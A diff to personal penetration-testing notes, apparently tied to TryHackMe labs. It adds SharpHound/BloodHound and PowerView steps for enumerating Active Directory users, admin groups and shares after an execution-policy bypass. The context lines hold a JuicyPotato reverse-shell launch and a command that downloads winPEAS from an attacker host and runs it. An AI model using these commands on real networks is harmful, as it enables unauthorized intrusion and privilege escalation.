@@ -109,8 +109,9 @@ JuicyPotato.exe -l 5050 -p C:\path\to\reverse-shell.exe -t *
 | WinPeas                   |                                                                                                                                                                                       |
 | PowerUp.ps1               | [https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1 ](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1) |
 | Windows Exploit Suggester | [https://github.com/AonCyberLabs/Windows-Exploit-Suggester.git](https://github.com/AonCyberLabs/Windows-Exploit-Suggester.git)                                                        |
-|                           |                                                                                                                                                                                       |
-|                           |                                                                                                                                                                                       |
+| SharpHound                | <pre><code>git clone https://github.com/BloodHoundAD/BloodHound.git
+</code></pre>                                                                                                     |
+| Powerview                 |                                                                                                                                                                                       |
 
 
 
@@ -188,4 +189,86 @@ cd C:\Windows\Temp
 powershell "(New-Object System.Net.WebClient).Downloadfile('http://$KALI:82/winPEASx64.exe','winPEASx64.exe')" 
 winPEASx64.exe
 ```
+
+
+
+## SharpHound
+
+**Examples**
+
+[post-exploitation-basics.md](../../walkthroughs/tryhackme/post-exploitation-basics.md "mention")
+
+Add this line to SharpHound.ps1 before transferring so I could run the command right away
+
+<figure><img src="../../.gitbook/assets/image (3) (1) (4) (1).png" alt=""><figcaption></figcaption></figure>
+
+**Victim**
+
+```
+powershell -ep bypass
+.\SharpHound.ps1
+```
+
+**Kali**
+
+```
+apt-get install bloodhound
+neo4j console
+bloodhound --no-sandbox
+```
+
+### Find all Domain Admins
+
+<figure><img src="../../.gitbook/assets/image (15) (7) (1).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="../../.gitbook/assets/image (84) (1) (1).png" alt=""><figcaption></figcaption></figure>
+
+### List all Kerberostable accounts
+
+<figure><img src="../../.gitbook/assets/image (85) (1).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="../../.gitbook/assets/image (1) (1) (1) (3).png" alt=""><figcaption></figcaption></figure>
+
+
+
+## Powerview
+
+**Examples**
+
+[post-exploitation-basics.md](../../walkthroughs/tryhackme/post-exploitation-basics.md "mention")
+
+**Victim**
+
+Run below to be able to run PowerView commands.
+
+```
+powershell -ep bypass
+. .\Downloads\PowerView.ps1
+```
+
+Enumerate the domain users.
+
+```
+Get-NetUser | select cn
+```
+
+Enumerate the domain groups.
+
+```
+Get-NetGroup -GroupName *admin*
+```
+
+Find Shared folders.
+
+```
+Invoke-ShareFinder
+```
+
+Get Operating systems on the network.
+
+```
+Get-NetComputer -fulldata | select operatingsystem
+```
+
+
 
